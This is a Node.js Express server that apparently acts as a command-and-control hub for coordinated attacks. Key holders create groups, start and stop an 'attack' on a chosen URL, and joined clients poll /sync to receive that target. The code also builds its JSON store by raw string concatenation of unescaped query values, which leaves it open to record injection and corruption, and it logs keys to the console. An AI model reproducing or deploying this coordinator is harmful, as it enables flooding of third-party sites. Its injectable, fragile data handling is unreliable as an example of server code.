const express = require('express')

const fs = require('fs')
const app = express()

const port = 3000
const filename = "database.json"

try {
    fs.accessSync(filename);
} catch (err) {
    fs.writeFileSync(filename, '[]');
}

async function checkRecord(attributes) {
    const jsonRecords = await fs.promises.readFile(filename, {
        encoding: 'utf8'
    });

    console.log(jsonRecords.replaceAll("\n", "").replaceAll(" ", ""))

    if (jsonRecords.replaceAll("\n", "").replaceAll(" ", "").includes(attributes)) {
        return true;
    } else {
        return false;

    }


    
}

async function replaceRecord(attributes, url) {
    const jsonRecords = await fs.promises.readFile(filename, {
        encoding: 'utf8'
    });

    //console.log(jsonRecords.replaceAll("\n", "").replaceAll(" ", ""))

    
    console.log(jsonRecords.replaceAll("\n", "").replaceAll(" ", "").replaceAll(attributes, ""))

    var sample_temp = jsonRecords.replaceAll("\n", "").replaceAll(" ", "").replaceAll(attributes+"}","").replaceAll(attributes+"}"+',',"")

    console.log("---"+sample_temp+"---")
    console.log("---"+sample_temp=="[]"+"---")
    console.log(sample_temp.slice(0, -1)+attributes.replaceAll("false", "true")+`, "url":"${url}"`+"]")

    if(sample_temp == "[]"){
        await fs.promises.writeFile(
            filename,
            sample_temp.slice(0, -1)+`{"url":"${url}",`+attributes.replaceAll("false", "true").substring(1)+"}]"
        );
    } else {
        await fs.promises.writeFile(
            filename,
            sample_temp.slice(0, -1)+`{"url":"${url}",`+attributes.replaceAll("false", "true").substring(1)+"}]"
        );
    }

}


async function replaceRecordStop(attributes, url) {
    const jsonRecords = await fs.promises.readFile(filename, {
        encoding: 'utf8'
    });

    //console.log(jsonRecords.replaceAll("\n", "").replaceAll(" ", ""))

    
    console.log(jsonRecords.replaceAll("\n", "").replaceAll(" ", "").replaceAll(attributes, ""))

    var sample_temp = jsonRecords.replaceAll("\n", "").replaceAll(" ", "").replaceAll(attributes+"}","").replaceAll(attributes+"}"+',',"")

    console.log("---"+sample_temp+"---")
    console.log("---"+sample_temp=="[]"+"---")
    console.log(sample_temp.slice(0, -1)+attributes.replaceAll("true", "false").replaceAll(url, "")+"]")

    if(sample_temp == "[]"){
        await fs.promises.writeFile(
            filename,
            sample_temp.slice(0, -1)+'"'+attributes.replaceAll("true", "false").replaceAll(url, "").substring(1)+"}]"
        );
    } else {
        await fs.promises.writeFile(
            filename,
            sample_temp.slice(0, -1)+'"'+attributes.replaceAll("true", "false").replaceAll(url, "").substring(1)+"}]"
        );
    }

}

async function createNewRecord(attributes) {
    const jsonRecords = await fs.promises.readFile(filename, {
        encoding: 'utf8'
    });

    const objRecord = JSON.parse(jsonRecords);
    objRecord.push(attributes);

    await fs.promises.writeFile(
        filename,
        JSON.stringify(objRecord, null, 2)
    );

    return attributes;
}

// Post route to handle form submission
// logic and add data to the database
app.get('/new', async (req, res) => {
    try {
        const checkRecords = await checkRecord(`{"group":"${req.query.id}"`); // dont use as referance
        console.log(checkRecords)
        if (checkRecords !== true) {
            const result = await createNewRecord({"group": req.query.id, "attack":"false", "key": req.query.key });
            res.sendStatus(201) // 201 --> Created
        } else {
            res.sendStatus(200) // 200 --> OK (but we still dont create new group haha)
        }


    } catch (err) {
        console.log(err)

    }
});

// Handle /join post requests
// check if record exists
app.get('/join', async (req, res) => {
    try {
        const checkRecords = await checkRecord(`"group":"${req.query.id}"`);
        console.log(checkRecords)
        if (checkRecords == true) {
            res.sendStatus(201) 
        } else if (checkRecords == false){
            res.sendStatus(200)
        }


    } catch (err) {
        console.log(err)
        res.sendStatus(500)
    }
});

app.get('/sync', async (req, res) => {
    try {
        const checkRecords = await checkRecord(`"group":"${req.query.id}","attack":"false"`);
        console.log(checkRecords)
        if (checkRecords) {
            res.sendStatus(500)
        } else if(await checkRecord(`"group":"${req.query.id}","attack":"true"`)) {
            const jsonRecords = await fs.promises.readFile(filename, {
                encoding: 'utf8'
            });
            json_array = JSON.parse(jsonRecords);
            for (var i = 0; i < json_array.length; i++) {
                console.log("-------------------------")
                console.log(json_array[i].toString())
                console.log(json_array[i].toString().includes(`"group":"${req.query.id}"`))
                if(json_array[i].group == req.query.id){
                    var record = json_array[i];
                    res.send(record.url);
                }

                
            }
              
            
        } else {
            res.sendStatus(500)
        }


    } catch (err) {
        console.log(err)
        res.sendStatus(500)
    }
});

app.get('/attack', async (req, res) => {
    try {

        console.log(`{"group":"${req.query.id}","key":"${req.query.key}"`)
        const checkRecords = await checkRecord(`{"group":"${req.query.id}","attack":"false","key":"${req.query.key}"`);
        console.log(checkRecords)
        if (checkRecords) {

            replaceRecord(`{"group":"${req.query.id}","attack":"false","key":"${req.query.key}"`, req.query.url)
            
            
            res.sendStatus(201)
            
        } else {
            res.sendStatus(200)
        }


    } catch (err) {
        console.log(err)
        res.sendStatus(500)
    }
});


// Stop attack
app.get('/stop', async (req, res) => {
    try {

        console.log(`{"group":"${req.query.id}","key":"${req.query.key}"`)
        const checkRecords = await checkRecord(`"group":"${req.query.id}","attack":"true","key":"${req.query.key}"`);
        console.log(checkRecords)
        if (checkRecords) {

            replaceRecordStop(`"group":"${req.query.id}","attack":"true","key":"${req.query.key}"`, req.query.url)
            
            
            res.sendStatus(201)
            
        } else {
            res.sendStatus(200)
        }


    } catch (err) {
        console.log(err)
        res.sendStatus(500)
    }
});


// Check if group id and key is correct

app.get('/check', async (req, res) => {
    try {

        console.log(`{"group":"${req.query.id}","key":"${req.query.key}"`)
        const checkRecords = await checkRecord(`"group":"${req.query.id}","attack":"false","key":"${req.query.key}"`);
        console.log(checkRecords)
        if (checkRecords) {
            return res.sendStatus(201);
        } else {
            const checkRecords1 = await checkRecord(`"group":"${req.query.id}","attack":"true","key":"${req.query.key}"`);
            if(checkRecords1){
                return res.sendStatus(201);
            } else {
                return res.sendStatus(500);
            }
        }

        return res.sendStatus(500);


    } catch (err) {
        console.log(err)
        res.sendStatus(500)
    }
});

// Server setup
app.listen(port, () => {
    console.log(`Server start on port ${port}`)
})
